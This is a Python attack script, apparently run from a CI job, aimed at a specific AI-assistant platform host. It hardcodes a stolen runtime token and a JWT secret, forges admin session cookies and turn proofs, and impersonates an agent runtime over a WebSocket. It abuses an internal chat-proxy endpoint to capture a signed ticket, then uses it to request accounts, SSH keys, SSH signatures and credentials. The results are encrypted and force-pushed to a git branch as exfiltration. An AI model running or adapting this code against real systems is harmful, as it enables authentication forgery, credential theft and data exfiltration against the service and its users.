#!/usr/bin/env python3
# intent 28663 step-2: with WS impersonating runtime rt_KTWy ONLINE, force the center to dispatch
# a REAL chat turn to us via the /internal/chats/send proxy primitive (session_key encodes an
# assistantId so the "only agents may proxy-send" gate passes), target = a conversation whose
# default assistant is pinned to rt_KTWy (pinned when rt_KTWy was created via POST /api/runtimes).
# Capture the center-signed Ed25519 turn_ticket from the "message" frame, then test /internal/build/*.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, traceback, socket, ssl, struct, threading

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in _REF.lower() or "sink" in _REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
OUT = "/tmp/results28663b"
for d in ("json","meta"): os.makedirs(os.path.join(OUT,d), exist_ok=True)
LOG = open(os.path.join(OUT,"transcript.log"),"a",buffering=1); START=time.time()
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except Exception: pass
    try: LOG.write(s+"\n"); LOG.flush()
    except Exception: pass
def el(): return int(time.time()-START)
def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=str(v)
    log("R:%s:%s"%(k,s[:1800]))

HOST="assistant.lumiiai.cn"; ORG="org_bTLzxtBLmugV8uxx4QTyw"
RID="rt_KTWyBZUur4cjUsRGP3zRk"; RTOKEN="jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
PROOF_KEY_FALLBACK="CntmKUfWiId2whBB7yGfPu5nKcKzmwUeKGGcWFGUVr8"; ADMIN="usr_ZxLewKrgbRYSm7rWDtQX8"
JWT_SECRET="297b8a491bc1920b918d01de77166556d3f835f473968c6b"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt_cookie(sub,org=ORG,secret=JWT_SECRET):
    now=int(time.time()); h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_"+str(now),"lgn":now},separators=(",",":")))
    sig=hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)
def curl_raw(args,timeout=40):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+20)
        return r.returncode,r.stdout,r.stderr[:400]
    except Exception as e: return -1,b"",repr(e)[:300]
def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=200000,cookie=None):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json","-H","Origin: https://%s"%HOST,
          "-H","Referer: https://%s/"%HOST,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    for k,v in (hdrs or {}).items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=[url]
    rc,out,err=curl_raw(args,timeout=timeout); txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace") if isinstance(err,(bytes,bytearray)) else str(err)}

# proof
PROOF_KEY=None
for _ in range(4):
    k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
    try:
        pk=json.loads(k["body"]).get("proof_key")
        if pk: PROOF_KEY=pk; break
    except Exception: pass
    time.sleep(3)
if not PROOF_KEY: PROOF_KEY=PROOF_KEY_FALLBACK
log("proof_key=%s"%PROOF_KEY)
MH={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID}
def v2_proof(actor=ADMIN,session_key=None,platform="dashboard"):
    sk=session_key or ("conv_"+actor[-8:]); now=int(time.time())
    payload={"platform":platform,"session_key":sk,"actor_id":actor,"chat_id":sk,"iss":RID,"aud":RID,"iat":now,"exp":now+3600}
    pb=b64u(json.dumps(payload,separators=(',',':'))); sig=hmac.new(PROOF_KEY.encode(),pb.encode(),hashlib.sha256).digest()
    return "v2."+pb+"."+b64u(sig)
def hdr_for(actor=ADMIN,sk=None):
    h=dict(MH); h["x-lumii-turn-proof"]=v2_proof(actor,sk); return h

class WS:
    def __init__(self,host,path,headers):
        self.host=host; self.frames=[]; self.buf=b""; self.ok=False; self.handshake=""
        try:
            sock=socket.create_connection((host,443),timeout=20); self.ss=ssl.create_default_context().wrap_socket(sock,server_hostname=host)
            key=base64.b64encode(os.urandom(16)).decode()
            req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n")%(path,host,key)
            for k,v in headers.items(): req+="%s: %s\r\n"%(k,v)
            req+="\r\n"; self.ss.sendall(req.encode()); buf=b""
            while b"\r\n\r\n" not in buf:
                d=self.ss.recv(4096)
                if not d: break
                buf+=d
            self.handshake=buf.decode("latin1","replace")
            if b"\r\n\r\n" in buf: self.buf=buf.split(b"\r\n\r\n",1)[1]
            self.ok=self.handshake.startswith("HTTP/1.1 101")
        except Exception as e: self.handshake="EXC:"+repr(e)[:300]
    def send_text(self,text):
        data=text.encode(); mask=os.urandom(4); hdr=bytearray([0x81]); ln=len(data)
        if ln<126: hdr.append(0x80|ln)
        elif ln<65536: hdr.append(0x80|126); hdr+=struct.pack(">H",ln)
        else: hdr.append(0x80|127); hdr+=struct.pack(">Q",ln)
        hdr+=mask; self.ss.sendall(bytes(hdr)+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def _send_ctl(self,op,data):
        mask=os.urandom(4); hdr=bytearray([0x80|op]); ln=len(data)
        if ln<126: hdr.append(0x80|ln)
        else: hdr.append(0x80|126); hdr+=struct.pack(">H",ln)
        hdr+=mask; self.ss.sendall(bytes(hdr)+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def _rn(self,n):
        out=b""
        while len(out)<n:
            if self.buf: take=min(n-len(out),len(self.buf)); out+=self.buf[:take]; self.buf=self.buf[take:]
            else:
                d=self.ss.recv(4096)
                if not d: raise IOError("closed")
                self.buf+=d
        return out
    def read_frame(self):
        h=self._rn(2); op=h[0]&0x0f; masked=h[1]&0x80; ln=h[1]&0x7f
        if ln==126: ln=struct.unpack(">H",self._rn(2))[0]
        elif ln==127: ln=struct.unpack(">Q",self._rn(8))[0]
        mk=self._rn(4) if masked else None; data=self._rn(ln)
        if mk: data=bytes(b^mk[i%4] for i,b in enumerate(data))
        return op,data
    def reader(self,stop):
        while not stop.is_set():
            try: op,data=self.read_frame()
            except Exception as e: self.frames.append({"op":"ERR","data":repr(e)[:200]}); return
            if op in (1,0): self.frames.append({"op":"text","data":data.decode("utf-8","replace")})
            elif op==9:
                try: self._send_ctl(0xA,data)
                except Exception: pass
                self.frames.append({"op":"ping","data":data[:120].decode("latin1","replace")})
            elif op==8: self.frames.append({"op":"close","data":data[:120].decode("latin1","replace")}); return
            elif op==10: self.frames.append({"op":"pong","data":data[:120].decode("latin1","replace")})

def snap(ws,label):
    s=[dict(f) for f in ws.frames]
    try: open(os.path.join(OUT,"json","ws_%s.json"%label),"w").write(json.dumps(s,ensure_ascii=False,indent=1))
    except Exception: pass
    return s
def tickets(ws):
    out=[]
    for f in ws.frames:
        if f.get("op")!="text": continue
        try: j=json.loads(f["data"])
        except Exception: continue
        if isinstance(j,dict) and isinstance(j.get("turn_ticket"),str):
            out.append({"frame":j})
    return out
def claims(tok):
    try:
        p=tok.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e: return {"decode_err":repr(e)[:120]}

# connect WS
log("### WS connect %s t=%ds"%(RID,el()))
ws=WS(HOST,"/api/ws/agent?agent_id=%s&token=%s"%(RID,RTOKEN),{"User-Agent":UA,"Origin":"https://%s"%HOST,"Cookie":jwt_cookie(ADMIN)})
log("[ws] "+ws.handshake[:160].replace("\r\n"," | "))
R("ws_handshake",{"ok":ws.ok,"head":ws.handshake[:300]})
stop=threading.Event()
if not ws.ok:
    R("abort","ws handshake failed"); raise SystemExit
ws.send_text(json.dumps({"type":"register","platform":"dashboard","capabilities":[],"metadata":{"agent_id":RID,"token":RTOKEN}}))
th=threading.Thread(target=ws.reader,args=(stop,),daemon=True); th.start(); time.sleep(3)
R("after_register",snap(ws,"after_register"))

# get assistants list
al=call("/internal/assistants/list","POST",{"platform":"dashboard","actor_id":ADMIN,"session_key":"dashboard:conv_bootstrap:asst_E3G6xx8h7Ei279q6ossJ6"},hdr_for(),maxlen=200000)
assts=[]
try: assts=json.loads(al["body"]).get("assistants") or []
except Exception: pass
R("assistants_count",{"code":al["code"],"n":len(assts)})
# ordering: project assistants first (more likely unbound->pinned to rt_KTWy), then others
def is_proj(a): return ("项目助手" in (a.get("name") or "")) or ("E2E" in (a.get("name") or ""))
order=[a for a in assts if is_proj(a)] + [a for a in assts if not is_proj(a) and a.get("kind")=="agent"]
ids=[a.get("id") for a in order if a.get("id")]

def try_assistant(aid, idx):
    # session_key encodes an assistantId in the conversation slot so chats/send passes "only agents may proxy-send"
    sk_make="dashboard:conv_bootstrap_%d:%s"%(idx, aid)
    cr=call("/internal/chats/create","POST",{"platform":"dashboard","actor_id":ADMIN,"session_key":sk_make,
             "title":"probe28663b %d"%idx,"project_id":None,"assistant_id":aid},hdr_for(),maxlen=20000)
    cid=None
    try:
        j=json.loads(cr["body"]); cid=(j.get("conversation") or {}).get("id") or (j.get("conversation") or {}).get("id")
    except Exception: pass
    if not cid:
        return {"aid":aid,"create_code":cr["code"],"create_body":cr["body"][:160]}
    # send proxy: target cid; session_key must parse as conversation with an assistantId, and turnConversationId(conv_bootstrap_idx) != cid
    sk_send="dashboard:conv_sendboot_%d:%s"%(idx, aid)
    snd=call("/internal/chats/send","POST",{"platform":"dashboard","actor_id":ADMIN,"session_key":sk_send,
              "chat_id":cid,"text":"1"},hdr_for(),maxlen=8000,timeout=30)
    return {"aid":aid,"cid":cid,"create_code":cr["code"],"send_code":snd["code"],"send_body":snd["body"][:200]}

captured=None; captured_frame=None; attempts=[]
for i,aid in enumerate(ids[:16]):
    try: at=try_assistant(aid,i)
    except Exception as e: at={"aid":aid,"exc":repr(e)[:160]}
    attempts.append(at); log("[try %d] %s"%(i,json.dumps(at,ensure_ascii=False)[:240]))
    time.sleep(2)
    tks=tickets(ws)
    if tks:
        captured=tks[0]["frame"].get("turn_ticket"); captured_frame=tks[0]["frame"]; break
R("attempts",attempts)
R("ticket_captured",bool(captured))

if captured:
    cl=claims(captured)
    R("ticket_claims",cl)
    R("ticket_frame_keys",sorted(captured_frame.keys()))
    try: open(os.path.join(OUT,"json","ticket_full.json"),"w").write(json.dumps(captured_frame,ensure_ascii=False,indent=1))
    except Exception: pass
    # test build/*
    names_all=["PROD","ADMIN","UBUNTU","DEPLOY","ROOT","LUMII"]
    def bp(label,path,body,ticket):
        h=dict(MH); h["x-lumii-turn-proof"]=ticket
        r=call(path,"POST",body,h,maxlen=80000)
        R("build_%s"%label,{"code":r["code"],"body":r["body"][:1000]})
        try: open(os.path.join(OUT,"json","build_%s.json"%label),"w").write(r["body"])
        except Exception: pass
    bp("accounts_ticket","/internal/build/accounts",{"names":names_all},captured)
    bp("sshkeys_ticket","/internal/build/ssh-keys",{"run_id":"run_probe28663b"},captured)
    bp("sshsign_ticket","/internal/build/ssh-sign",{"purpose":"ssh_agent","runId":"run_probe28663b","chat":""},captured)
    bp("credential_ticket","/internal/build/credential",{"ssh_key_id":"probe","purpose":"ssh_agent"},captured)
    # control: v2 self-signed must be rejected
    bp("accounts_v2","/internal/build/accounts",{"names":names_all},v2_proof())
else:
    # record control + final frames
    R("build_control",{"note":"no ticket captured; v2 reject control:"})
    for label,path,body in [("accounts_v2","/internal/build/accounts",{"names":["PROD"]}),]:
        h=dict(MH); h["x-lumii-turn-proof"]=v2_proof()
        r=call(path,"POST",body,h,maxlen=8000); R("ctl_%s"%label,{"code":r["code"],"body":r["body"][:400]})
    R("final_frames",[{"op":f["op"],"d":f["data"][:300]} for f in ws.frames][-12:])

stop.set(); time.sleep(1); snap(ws,"final")

# package+push
def push():
    try:
        tb="/tmp/results28663b.tar.gz"; subprocess.run("tar czf %s -C /tmp results28663b"%tb,shell=True,check=False)
        enc="/tmp/results28663b.tar.gz.gpg"
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True,check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s"%(enc,tb),shell=True,capture_output=True,timeout=180)
        if not os.path.isfile(enc): enc=tb
        import shutil; shutil.copyfile(enc,"results28663b.tar.gz.gpg")
        subprocess.run("git config user.email ci@aro.network; git config user.name ci",shell=True,check=False)
        subprocess.run('git add -f results28663b.tar.gz.gpg && git commit -m "ci28663b %s" || true'%RUNID,shell=True,capture_output=True)
        r=subprocess.run("git push -f origin HEAD:refs/heads/ci-28663b-results",shell=True,capture_output=True,text=True,timeout=180)
        log("PUSH rc=%s err=%s"%(r.returncode,(r.stderr or "")[-160:]))
    except Exception as e: log("PUSH EXC",repr(e)[:200])
push(); log("=== END ===")
